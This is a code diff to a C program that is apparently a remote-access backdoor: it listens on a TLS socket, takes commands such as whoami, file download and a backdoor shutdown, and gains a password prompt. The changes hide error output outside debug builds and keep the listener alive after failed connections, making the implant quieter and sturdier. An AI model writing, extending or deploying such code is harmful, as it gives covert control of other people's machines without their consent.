@@ -10,6 +10,7 @@
 #include <pwd.h>
 #include <libgen.h>
 #include <curl/curl.h>
+#include <stdbool.h>
 
 //---------------------------------------------------------------------------------------------------------------
 
@@ -17,8 +18,15 @@
 
 //---------------------------------------------------------------------------------------------------------------
 
+//#define DEBUG
+
+#ifdef DEBUG
 #define CERT_FILE "../cert.pem"
 #define KEY_FILE "../key.pem"
+#else
+#define CERT_FILE "cert.pem"
+#define KEY_FILE "key.pem"
+#endif
 
 //---------------------------------------------------------------------------------------------------------------
 
@@ -32,17 +40,26 @@ int create_socket(int port) {
 
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	if (s < 0) {
+		#ifdef DEBUG
 		perror("Unable to create socket");
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 
 	if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+		#ifdef DEBUG
 		perror("Unable to bind");
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 
 	if (listen(s, 1) < 0) {
+		#ifdef DEBUG
 		perror("Unable to listen");
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 
@@ -71,8 +88,11 @@ SSL_CTX *create_context() {
 
 	ctx = SSL_CTX_new(method);
 	if (!ctx) {
+		#ifdef DEBUG
 		perror("Unable to create SSL context");
 		ERR_print_errors_fp(stderr);
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 
@@ -85,12 +105,18 @@ void configure_context(SSL_CTX *ctx) {
 	SSL_CTX_set_ecdh_auto(ctx, 1);
 
 	if (SSL_CTX_use_certificate_file(ctx, CERT_FILE, SSL_FILETYPE_PEM) <= 0) {
+		#ifdef DEBUG
 		ERR_print_errors_fp(stderr);
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 
 	if (SSL_CTX_use_PrivateKey_file(ctx, KEY_FILE, SSL_FILETYPE_PEM) <= 0 ) {
+		#ifdef DEBUG
 		ERR_print_errors_fp(stderr);
+		#endif
+		
 		exit(EXIT_FAILURE);
 	}
 }
@@ -147,11 +173,7 @@ void parse_command(SSL *ssl, char *buf, int len) {
 					SSL_write(ssl, ERR_UNCAUGHT, strlen(ERR_UNCAUGHT));
 					break;
 			}
-			return;
-		}
-		
-		SSL_write(ssl, CMD_SUCCESS, strlen(CMD_SUCCESS));
-		
+		}	
 	} else if (strncmp(buf, CMD_WHOAMI, strlen(CMD_WHOAMI)) == 0) {
 		register struct passwd *pw;
 		register uid_t uid;
@@ -159,7 +181,7 @@ void parse_command(SSL *ssl, char *buf, int len) {
 		
 		uid = geteuid();
 		pw = getpwuid(uid);
-		snprintf(output, sizeof(output), CMD_WHOAMI_RET "%s\n", pw->pw_name);
+		snprintf(output, sizeof(output), CMD_WHOAMI_RET "%s", pw->pw_name);
 		
 		if (pw) {
 			SSL_write(ssl, output, strlen(output));
@@ -184,16 +206,19 @@ void parse_command(SSL *ssl, char *buf, int len) {
 		char output[1024] = {0};
 				
 		int ret = download(buf, filename);
-		sprintf(output, "Return code: %d\n", ret);
+		sprintf(output, "Return code: %d", ret);
 		SSL_write(ssl, output, strlen(output));
 	} else if (strncmp(buf, CMD_HELP, strlen(CMD_HELP)) == 0) {
-		SSL_write(ssl, CMD_HELP_OUT, strlen(CMD_HELP_OUT)) == 0);		
+		SSL_write(ssl, CMD_HELP_OUT, strlen(CMD_HELP_OUT));
+		
+	} else if (strncmp(buf, CMD_BKD_SHUTDOWN, strlen(CMD_BKD_SHUTDOWN)) == 0) {
+		SSL_write(ssl, "Shutting down...\n\n", strlen("Shutting down...\n\n"));
+		exit(EXIT_SUCCESS);	
 	} else {
 		SSL_write(ssl, CMD_NO_RECON, strlen(CMD_NO_RECON));
-		return;
 	}
 	
-	SSL_write(ssl, CMD_SUCCESS, strlen(CMD_SUCCESS));
+	SSL_write(ssl, CMD_END, strlen(CMD_END));
 }
 
 //---------------------------------------------------------------------------------------------------------------
@@ -201,6 +226,7 @@ void parse_command(SSL *ssl, char *buf, int len) {
 int main(int argc, char **argv) {
 	int sock;
 	SSL_CTX *ctx;
+	bool end_client;
 
 	init_openssl();
 	ctx = create_context();
@@ -212,26 +238,42 @@ int main(int argc, char **argv) {
 		struct sockaddr_in addr;
 		uint len = sizeof(addr);
 		SSL *ssl;
+		end_client = false;
+		
 		char recv_buffer[1024] = {0};
+		memset(recv_buffer, 1, sizeof(recv_buffer));
 
 		int client = accept(sock, (struct sockaddr*)&addr, &len);
 		if (client < 0) {
-			perror("Unable to accept");
-			exit(EXIT_FAILURE);
+			#ifdef DEBUG
+			perror("Unable to accept client.");
+			#endif
+			continue;
 		}
 
 		ssl = SSL_new(ctx);
 		SSL_set_fd(ssl, client);
 
 		if (SSL_accept(ssl) <= 0) {
+			#ifdef DEBUG
 			ERR_print_errors_fp(stderr);
-			break;
+			#endif
+			continue;
 		}
 		
-		while (1) {
+		SSL_write(ssl, AUTH_QUEST, strlen(AUTH_QUEST));
+		SSL_read(ssl, recv_buffer, sizeof(recv_buffer));
+		if (strncmp(recv_buffer, AUTH_PWD, strlen(AUTH_PWD)) != 0) {
+			SSL_write(ssl, AUTH_FAIL, strlen(AUTH_FAIL));
+			end_client = true;
+		}
+		
+		SSL_write(ssl, AUTH_SUCCESS, strlen(AUTH_SUCCESS));
+		
+		while (!end_client) {
 			SSL_read(ssl, recv_buffer, sizeof(recv_buffer));	// Read buffer from ssl
 			if (strncmp(recv_buffer, CMD_EXIT, strlen(CMD_EXIT)) == 0)	// Check if command is "exit"
-				break;
+				end_client = true;
 			
 			recv_buffer[strlen(recv_buffer) - 1] = 0;	// Removing trailing \n
 			
